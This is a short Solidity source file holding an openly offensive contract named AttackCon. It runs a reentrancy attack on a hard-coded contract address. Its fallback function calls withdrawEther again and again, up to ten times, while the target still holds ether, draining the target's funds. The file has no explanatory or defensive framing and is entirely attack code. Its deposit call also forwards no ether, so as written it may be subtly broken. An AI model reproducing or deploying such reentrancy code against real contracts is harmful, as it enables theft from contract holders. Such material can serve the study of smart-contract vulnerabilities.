pragma solidity ^0.4.8;

contract AttackCon{
    
    address private owner;
    address private _vulnerableAdd = 0x692a70d2e424a56d2c6c27aa97d1a86395877b3a;
    
    
    uint stack = 0;
    uint constant stackLimit = 10;
    uint amount;
    
    proxy vul = proxy(_vulnerableAdd);
    
    constructor(){
        owner = msg.sender;
    }
    
    function AttackerDeposit() payable {
        vul.depositEther();
        vul.withdrawEther();
    }
    

    function() public payable{
        if(address(_vulnerableAdd).balance >= msg.value && stack < 10) {
            stack++;
            vul.withdrawEther();}
    }
    
    function balanca() public view returns(uint256){
        return address(this).balance;
    }
    



    
}

contract proxy{
    
        function depositEther() public payable;  
        function withdrawEther() public;
        function contractBalance() public view returns(uint);

}